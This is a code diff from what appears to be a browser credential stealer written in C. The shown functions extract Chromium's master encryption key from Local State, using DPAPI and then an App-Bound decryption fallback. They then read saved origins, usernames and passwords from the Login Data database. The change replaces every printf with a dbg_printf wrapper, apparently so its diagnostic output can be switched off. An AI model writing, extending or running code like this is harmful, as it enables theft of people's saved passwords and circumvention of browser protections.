@@ -11,6 +11,7 @@
 #include "chrome_crypto.h"
 #include "appbound.h"
 #include "sqlite.h"
+#include "config.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
@@ -164,14 +165,14 @@ static int get_master_key(const char *base_path, unsigned char *key32) {
 
     size_t json_len = 0;
     unsigned char *json = read_file(ls_path, &json_len);
-    if (!json) { printf("[!] get_master_key: Local State read failed\n"); free(ls_path); return -1; }
+    if (!json) { dbg_printf("[!] get_master_key: Local State read failed\n"); free(ls_path); return -1; }
 
     unsigned char enc_key[4096];
     size_t enc_len = 0;
     int rc = chrome_extract_encrypted_key((const char *)json, json_len,
                                           enc_key, sizeof(enc_key), &enc_len);
     free(json);
-    if (rc < 0) { printf("[!] get_master_key: encrypted_key extraction failed\n"); free(ls_path); return -1; }
+    if (rc < 0) { dbg_printf("[!] get_master_key: encrypted_key extraction failed\n"); free(ls_path); return -1; }
     
 
     unsigned char dpapi_key[256];
@@ -186,7 +187,7 @@ static int get_master_key(const char *base_path, unsigned char *key32) {
         free(ls_path);
         return 0;
     }
-    printf("[!] get_master_key: DPAPI failed (error 13 = App-Bound?)\n");
+    dbg_printf("[!] get_master_key: DPAPI failed (error 13 = App-Bound?)\n");
 
     /* ── Strategy 2: App-Bound decryption via appbound module ─── */
 
@@ -206,7 +207,7 @@ static int get_master_key(const char *base_path, unsigned char *key32) {
         return 0;
     }
 
-    printf("[!] get_master_key: all strategies failed\n");
+    dbg_printf("[!] get_master_key: all strategies failed\n");
     free(ls_path);
     return -1;
 }
@@ -228,12 +229,12 @@ char **extract_chromium_logins(const char *profile_path,
     size_t db_len = 0;
     unsigned char *db_data = read_file(db_path, &db_len);
     free(db_path);
-    if (!db_data) { printf("[!] Login Data: read_file failed\n"); return NULL; }
+    if (!db_data) { dbg_printf("[!] Login Data: read_file failed\n"); return NULL; }
     
 
     SqliteDb db;
     if (sqlite_open(&db, db_data, db_len) != 0) {
-        printf("[!] Login Data: sqlite_open failed\n");
+        dbg_printf("[!] Login Data: sqlite_open failed\n");
         free(db_data);
         return NULL;
     }
@@ -241,7 +242,7 @@ char **extract_chromium_logins(const char *profile_path,
     SqliteRow *rows = NULL;
     size_t row_count = 0;
     if (sqlite_read_table(&db, "logins", &rows, &row_count) != 0) {
-        printf("[!] Login Data: sqlite_read_table(\"logins\") failed\n");
+        dbg_printf("[!] Login Data: sqlite_read_table(\"logins\") failed\n");
         sqlite_close(&db);
         free(db_data);
         return NULL;
@@ -266,7 +267,7 @@ char **extract_chromium_logins(const char *profile_path,
     sqlite_free_columns(&cols);
 
     if (idx_origin < 0 || idx_user < 0 || idx_pass < 0) {
-        printf("[!] Login Data: columns not found (origin=%d user=%d pass=%d)\n", idx_origin, idx_user, idx_pass);
+        dbg_printf("[!] Login Data: columns not found (origin=%d user=%d pass=%d)\n", idx_origin, idx_user, idx_pass);
         sqlite_free_rows(rows, row_count);
         sqlite_close(&db);
         free(db_data);
